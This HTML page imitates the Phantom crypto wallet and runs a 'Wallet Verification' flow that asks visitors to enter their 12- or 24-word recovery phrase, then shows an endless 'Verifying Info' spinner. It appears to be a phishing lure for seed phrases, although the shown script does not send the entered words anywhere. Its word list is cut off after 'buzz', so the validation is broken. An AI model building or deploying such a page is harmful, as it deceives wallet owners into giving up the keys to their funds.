<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }

        body {
            background-color: #e2e0fd;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 24px 32px;
            overflow: hidden;
        }

        /* Top Header Navigation */
        header {
            display: flex;
            justify-content: flex-start;
            align-items: center;
            width: 100%;
            z-index: 10;
        }

        .ghost-close {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            cursor: pointer;
            padding: 0;
            text-decoration: none;
            width: 80px;
            height: 65px;
        }

        .phantom-logo {
            width: 80px;
            height: 65px;
        }

        /* Hover only triggers when cursor is directly over the ghost paths */
        .phantom-logo path, 
        .phantom-logo ellipse {
            transition: fill 0.2s ease;
        }

        .ghost-close:hover .phantom-logo path {
            fill: #71717a;
        }

        .ghost-close:hover .phantom-logo ellipse {
            fill: #e2e0fd; 
        }

        /* Main Modal Container */
        .main-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            flex: 1;
            position: relative;
            z-index: 5;
        }

        .modal {
            background-color: #0c0c0e;
            width: 450px;
            border-radius: 24px;
            padding: 20px 22px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
            border: none;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        /* Pagination Dots */
        .dots {
            display: flex;
            gap: 8px;
            margin-bottom: 6px;
            margin-top: -2px;
        }

        .dot {
            width: 10px;
            height: 10px;
            background-color: #3f3f46;
            border-radius: 50%;
        }

        .dot.active {
            background-color: #b794f4;
            width: 11px;
            height: 11px;
        }

        /* Modal Titles */
        .modal-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 4px;
            color: #fff;
            text-align: center;
        }

        .modal-subtitle {
            font-size: 13px;
            color: #8c8c9e;
            margin-bottom: 12px;
            text-align: center;
            line-height: 1.4;
            min-height: 18px;
        }

        /* Screen States */
        .screen-center {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            width: 100%;
            padding: 10px 0;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #27272a;
            border-top: 3px solid #b794f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hidden {
            display: none !important;
        }

        /* Inputs Container Layout - Centered */
        .inputs-container {
            display: grid;
            grid-template-columns: repeat(3, 126px);
            justify-content: center;
            gap: 6px;
            width: 100%;
            margin-bottom: 12px;
        }

        /* Vertical height sizing for boxes */
        .inputs-container.mode-12 .input-group {
            height: 50px;
        }

        .inputs-container.mode-24 .input-group {
            height: 38px;
        }

        /* Input Group styling */
        .input-group {
            position: relative;
            background-color: #141417;
            border: 1px solid #272730;
            border-radius: 10px;
            padding: 0 10px;
            display: flex;
            align-items: center;
            gap: 5px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-group:focus-within {
            border-color: #c5bfff;
            box-shadow: 0 0 0 0.5px #c5bfff;
        }

        .input-group.error {
            border-color: #ef4444 !important;
            box-shadow: 0 0 0 0.5px #ef4444 !important;
        }

        .input-group label {
            font-size: 13.5px;
            color: #71717a;
            font-weight: 500;
            min-width: 20px;
            line-height: 1;
            user-select: none;
        }

        .input-group input {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 14.5px;
            outline: none;
            width: 100%;
            line-height: 1.2;
            user-select: none;
            -webkit-user-select: none;
        }

        /* Toggle Phrase Button */
        .toggle-phrase {
            color: #9c9cae;
            background: none;
            border: none;
            font-size: 13px;
            cursor: pointer;
            margin-bottom: 12px;
            font-weight: 500;
            transition: color 0.25s ease;
            pointer-events: auto;
        }

        .toggle-phrase:hover {
            color: #b794f4;
        }

        /* Action Buttons */
        .action-btn {
            width: 100%;
            background-color: #1c1c21;
            color: #71717a;
            border: none;
            border-radius: 12px;
            padding: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            pointer-events: none;
            transition: all 0.2s ease;
        }

        .action-btn.active-btn {
            background-color: #b794f4;
            color: #000;
            cursor: pointer;
            pointer-events: auto;
        }

        .action-btn.active-btn:hover {
            opacity: 0.85;
        }
    </style>
</head>
<body>

    <!-- Header with Clickable Ghost Logo -->
    <header>
        <a href="https://phantom.com" target="_blank" class="ghost-close" title="Phantom">
            <svg class="phantom-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 136 136" role="img" aria-label="Ghost">
                <rect width="136" height="136" fill="#e2e0fd"/>

                <ellipse cx="79.5" cy="60.1" rx="3.6" ry="4.45" fill="#e2e0fd"/>
                <ellipse cx="90.6" cy="60.1" rx="3.6" ry="4.45" fill="#e2e0fd"/>
            </svg>
        </a>
    </header>

    <!-- Main Section -->
    <div class="main-wrapper">
        <div class="modal">
            <!-- Initial Welcome Screen -->
            <div class="screen-center" id="welcomeScreen">
                <div class="dots">
                    <div class="dot active"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
                <div class="modal-title">Wallet Verification</div>
                <div class="modal-subtitle">Begin wallet verification by adding your recovery phrase.</div>
                <button type="button" class="action-btn active-btn" id="startBtn" style="pointer-events: auto; cursor: pointer;">Continue</button>
            </div>

            <!-- Recovery Phrase Input Screen -->
            <div id="phraseScreen" class="hidden" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
                <div class="dots">
                    <div class="dot active"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>

                <div class="modal-title">Recovery Phrase</div>
                <div class="modal-subtitle" id="subtitle-text">Import an existing wallet with your 12 or 24-word recovery phrase.</div>

                <div class="inputs-container mode-12" id="inputsGrid"></div>

                <button type="button" class="toggle-phrase" id="toggleBtn">I have a 24-word recovery phrase</button>

                <button type="button" class="action-btn" id="importBtn">Import Wallet</button>
            </div>

            <!-- Loading / Verification Screen -->
            <div class="screen-center hidden" id="loadingScreen">
                <div class="dots">
                    <div class="dot active"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
                <div class="spinner"></div>
                <div class="modal-title">Verifying Info</div>
                <div class="modal-subtitle">Verifying info, est. 2-5 mins</div>
            </div>
        </div>
    </div>

    <!-- Script Logic -->
    <script>
        let wordCount = 12;
        const defaultSubtitle = "Import an existing wallet with your 12 or 24-word recovery phrase.";
        
        const welcomeScreen = document.getElementById('welcomeScreen');
        const phraseScreen = document.getElementById('phraseScreen');
        const loadingScreen = document.getElementById('loadingScreen');
        const startBtn = document.getElementById('startBtn');
        const inputsGrid = document.getElementById('inputsGrid');
        const toggleBtn = document.getElementById('toggleBtn');
        const subtitleText = document.getElementById('subtitle-text');
        const importBtn = document.getElementById('importBtn');

        const validWords = new Set([
            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
            "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
            "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
            "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert",
            "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter",
            "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger",
            "angle", "angry", "animal", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety",
            "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area",
            "arena", "argue", "arm", "armed", "armor", "army", "arouse", "arrange", "arrest", "arrive",
            "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist",
            "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit",
            "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware",
            "away", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball",
            "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket",
            "battle", "beach", "beacon", "beam", "bean", "beauty", "because", "become", "bed", "bedroom",
            "beer", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit",
            "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology",
            "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless",
            "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body",
            "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss",
            "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread",
            "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "brother", "brown", "brush",
            "bubble", "bucket", "budget", "buffalo", "build", "bulb", "bunker", "burden", "burger", "burst",
            "bus", "business", "busy", "butter", "buyer", "buzz"
        ]);

        startBtn.onclick = function(e) {
            e.preventDefault();
            welcomeScreen.classList.add('hidden');
            phraseScreen.classList.remove('hidden');
            renderInputs();
        };

        function renderInputs() {
            inputsGrid.innerHTML = '';
            if (wordCount === 12) {
                inputsGrid.className = "inputs-container mode-12";
            } else {
                inputsGrid.className = "inputs-container mode-24";
            }

            for (let i = 1; i <= wordCount; i++) {
                const group = document.createElement('div');
                group.className = 'input-group';
                group.id = `group-${i}`;
                group.innerHTML = `
                    <label>${i}.</label>
                    <input type="text" autocomplete="off" autocapitalize="off" spellcheck="false" data-index="${i}" id="word-${i}">
                `;
                inputsGrid.appendChild(group);
            }
            checkCompletion();
        }

        toggleBtn.onclick = function(e) {
            e.preventDefault();
            if (wordCount === 12) {
                wordCount = 24;
                toggleBtn.textContent = "I have a 12-word recovery phrase";
                subtitleText.textContent = "Import an existing wallet with your 24-word recovery phrase.";
            } else {
                wordCount = 12;
                toggleBtn.textContent = "I have a 24-word recovery phrase";
                subtitleText.textContent = defaultSubtitle;
            }
            renderInputs();
        };

        function checkCompletion() {
            let allFilled = true;
            for (let i = 1; i <= wordCount; i++) {
                const inputEl = document.getElementById(`word-${i}`);
                if (!inputEl || inputEl.value.trim() === "") {
                    allFilled = false;
                    break;
                }
            }

            if (allFilled) {
                importBtn.classList.add('active-btn');
            } else {
                importBtn.classList.remove('active-btn');
            }
        }

        inputsGrid.addEventListener('focusout', (e) => {
            if (e.target.tagName === 'INPUT') {
                const index = e.target.getAttribute('data-index');
                const groupEl = document.getElementById(`group-${index}`);
                const val = e.target.value.trim().toLowerCase();

                if (val !== "") {
                    if (!validWords.has(val)) {
                        groupEl.classList.add('error');
                        subtitleText.textContent = `Word ${index} incorrect or misspelt`;
                        subtitleText.style.color = '#ef4444';
                    } else {
                        groupEl.classList.remove('error');
                        subtitleText.textContent = defaultSubtitle;
                        subtitleText.style.color = '#8c8c9e';
                    }
                } else {
                    groupEl.classList.remove('error');
                    subtitleText.textContent = defaultSubtitle;
                    subtitleText.style.color = '#8c8c9e';
                }
            }
        }, true);

        inputsGrid.addEventListener('input', (e) => {
            if (e.target.tagName === 'INPUT') {
                const index = e.target.getAttribute('data-index');
                const groupEl = document.getElementById(`group-${index}`);
                groupEl.classList.remove('error');
                checkCompletion();
            }
        });

        importBtn.onclick = function(e) {
            e.preventDefault();
            if (!importBtn.classList.contains('active-btn')) return;

            phraseScreen.classList.add('hidden');
            loadingScreen.classList.remove('hidden');
        };
    </script>
</body>
</html>
